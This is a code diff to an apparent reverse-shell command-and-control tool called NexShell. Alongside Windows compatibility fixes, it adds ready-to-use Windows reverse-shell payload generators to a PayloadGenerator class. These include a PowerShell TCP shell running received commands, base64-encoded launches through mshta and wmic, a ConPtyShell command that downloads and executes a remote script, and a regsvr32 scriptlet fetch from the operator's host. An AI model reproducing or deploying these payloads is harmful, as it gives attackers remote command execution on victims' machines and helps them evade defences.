@@ -26,10 +26,53 @@ __banner__    = r"""
               Nexus of Shell Operations  ·  Elite Reverse Shell Commander
 """
 
-import os, io, re, sys, tty, ssl, time, gzip, json, shlex, queue, struct
-import shutil, socket, signal, base64, secrets, termios, tarfile, logging
+import os, io, re, sys, ssl, time, gzip, json, shlex, queue, struct
+import shutil, socket, signal, base64, secrets, tarfile, logging
 import zipfile, inspect, tempfile, platform, itertools, traceback, threading
 import subprocess, socketserver
+
+# ── Platform detection ────────────────────────────────────────────────────────
+IS_WINDOWS = os.name == 'nt'
+IS_UNIX    = not IS_WINDOWS
+
+# ── Unix-only modules (conditional) ──────────────────────────────────────────
+if IS_UNIX:
+    import tty
+    import termios
+    import fcntl
+    import pty as _pty_mod
+else:
+    tty      = None
+    termios  = None
+    fcntl    = None
+    _pty_mod = None
+
+# ── Readline (optional — not available everywhere on Windows) ─────────────────
+try:
+    import readline as _readline
+    HAS_READLINE = True
+except ImportError:
+    _readline    = None
+    HAS_READLINE = False
+
+# ── Windows terminal: enable ANSI escape codes ────────────────────────────────
+if IS_WINDOWS:
+    try:
+        import ctypes
+        kernel32 = ctypes.windll.kernel32
+        # Enable ENABLE_VIRTUAL_TERMINAL_PROCESSING (0x0004) on stdout
+        kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
+        kernel32.SetConsoleMode(kernel32.GetStdHandle(-12), 7)
+    except Exception:
+        pass
+    # Force UTF-8 on Windows stdout/stderr — prevents UnicodeEncodeError
+    import io as _io
+    if hasattr(sys.stdout, 'buffer'):
+        sys.stdout = _io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace', line_buffering=True)
+    if hasattr(sys.stderr, 'buffer'):
+        sys.stderr = _io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace', line_buffering=True)
+    # Windows does not have select() on stdin — provide a shim
+    from threading import Event as _WinEvent
 
 from math      import ceil
 from glob      import glob
@@ -268,10 +311,46 @@ class PayloadGenerator:
                f'$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};'
                f'while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){{'
                f'$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);'
-               f'$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+\"PS \"+(pwd).Path+\"> \";'
+               f'$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+"PS "+(pwd).Path+"> ";'
                f'$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);'
                f'$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()')
         return f'powershell -nop -NonI -ep bypass -c "{cmd}"'
+
+    @staticmethod
+    def mshta(host, port):
+        cmd = (f'$c=New-Object Net.Sockets.TCPClient("{host}",{port});'
+               f'$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};'
+               f'while(($i=$s.Read($b,0,$b.Length))-ne 0){{'
+               f'$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);'
+               f'$r=(iex $d 2>&1|Out-String);'
+               f'$sb=([Text.Encoding]::ASCII).GetBytes($r+"PS "+(pwd).Path+"> ");'
+               f'$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()')
+        enc = base64.b64encode(cmd.encode('utf-16-le')).decode()
+        return f'mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell -enc {enc}"",0:close")'
+
+    @staticmethod
+    def wmic(host, port):
+        cmd = (f'$c=New-Object Net.Sockets.TCPClient("{host}",{port});'
+               f'$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};'
+               f'while(($i=$s.Read($b,0,$b.Length))-ne 0){{'
+               f'$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);'
+               f'$r=(iex $d 2>&1|Out-String);'
+               f'$sb=([Text.Encoding]::ASCII).GetBytes($r+"PS "+(pwd).Path+"> ");'
+               f'$s.Write($sb,0,$sb.Length)}};$c.Close()')
+        enc = base64.b64encode(cmd.encode('utf-16-le')).decode()
+        return f'wmic process call create "powershell -nop -ep bypass -enc {enc}"'
+
+    @staticmethod
+    def conptyshell(host, port):
+        setup  = ('IEX(New-Object Net.WebClient).DownloadString('
+                  "'https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1');")
+        invoke = f'Invoke-ConPtyShell -RemoteIp {host} -RemotePort {port} -Rows 50 -Cols 220'
+        enc    = base64.b64encode((setup + invoke).encode('utf-16-le')).decode()
+        return f'powershell -nop -NonI -ep bypass -enc {enc}'
+
+    @staticmethod
+    def regsvr32(host, port):
+        return f'regsvr32 /s /n /u /i:http://{host}:{port}/payload.sct scrobj.dll'
 
     @classmethod
     def obfuscate_b64(cls, payload: str) -> str:
@@ -329,13 +408,15 @@ class PayloadGenerator:
     def display(cls, host: str, port: int, obfuscate: bool = False,
                 target_os: str = 'all'):
         payloads = cls.all_payloads(host, port, obfuscate, target_os)
+        os_icons = {'linux': 'Linux', 'windows': 'Windows', 'all': 'All Platforms'}
+        os_label_str = os_icons.get(target_os, 'All')
         os_label = {
-            'linux': paint('🐧 Linux').lime,
-            'windows': paint('🪟 Windows').cyan,
-            'all': paint('🌐 All Platforms').purple,
-        }.get(target_os, paint('All').purple)
+            'linux':   paint(f'[Linux]').lime,
+            'windows': paint(f'[Windows]').cyan,
+            'all':     paint(f'[All Platforms]').purple,
+        }.get(target_os, paint('[All]').purple)
         print(f'\n  {paint("NexShell Payload Arsenal").purple_BRIGHT}  '
-              f'{paint(f"→ {host}:{port}").teal}  [{os_label}]\n')
+              f'{paint(f"-> {host}:{port}").teal}  {os_label}\n')
         linux_done = False
         for i, p in enumerate(payloads, 1):
             name = p["name"]
@@ -343,11 +424,17 @@ class PayloadGenerator:
             if target_os == 'all':
                 if not linux_done and any(x in name for x in ['powershell','mshta','wmic','conpty','regsvr']):
                     linux_done = True
-                    print(f'  {paint("── Windows ────────────────────────────────────────").darkgrey}')
+                    print(f'  {paint("-- Windows --------------------------------------------------").darkgrey}')
                 elif i == 1:
-                    print(f'  {paint("── Linux ──────────────────────────────────────────").darkgrey}')
-            col = paint(name).cyan if 'LOLBin' not in name and 'PTY' not in name else paint(name).orange
-            print(f'  {paint(f"[{i:02d}]").purple} {col:<30} {paint(p["payload"]).white}')
+                    print(f'  {paint("-- Linux ----------------------------------------------------").darkgrey}')
+            # Build colored name — pad using str operations
+            if 'LOLBin' in name or 'PTY' in name:
+                col_str = str(paint(name).orange)
+            else:
+                col_str = str(paint(name).cyan)
+            # Pad to fixed width (accounting for ANSI escape codes — use raw name for width)
+            pad = max(0, 28 - len(name))
+            print(f'  {paint(f"[{i:02d}]").purple} {col_str}{" " * pad} {paint(p["payload"]).white}')
             if obfuscate:
                 print(f'       {paint("base64:").darkgrey} {p.get("b64","")}')
                 print(f'       {paint("hex:   ").darkgrey} {p.get("hex","")}')
@@ -1862,14 +1949,24 @@ def build_parser():
 
 
 # ══════════════════════════════════════════════════════════════════════════════
+#  WINDOWS UTF-8 STDOUT FIX
+# ══════════════════════════════════════════════════════════════════════════════
+
+# ══════════════════════════════════════════════════════════════════════════════
 #  STARTUP BANNER
 # ══════════════════════════════════════════════════════════════════════════════
 def print_banner():
-    print(paint(__banner__).purple)
+    try:
+        print(paint(__banner__).purple)
+    except (UnicodeEncodeError, UnicodeDecodeError):
+        # Fallback for Windows terminals without UTF-8
+        safe = __banner__.encode('ascii', errors='replace').decode()
+        print(paint(safe).purple)
     print(f"  {paint('Version').teal} {paint(__version__).lime}  "
-          f"{paint('·').darkgrey}  "
+          f"{paint('*').darkgrey}  "
           f"{paint('by').teal} {paint(__author__).orange}  "
-          f"{paint('·').darkgrey}  "
+          f"{paint('*').darkgrey}  "
+          f"Platform: {paint('Windows' if IS_WINDOWS else platform.system()).cyan}  "
           f"Escape: {paint(options.escape['key']).yellow}\n")
 
 
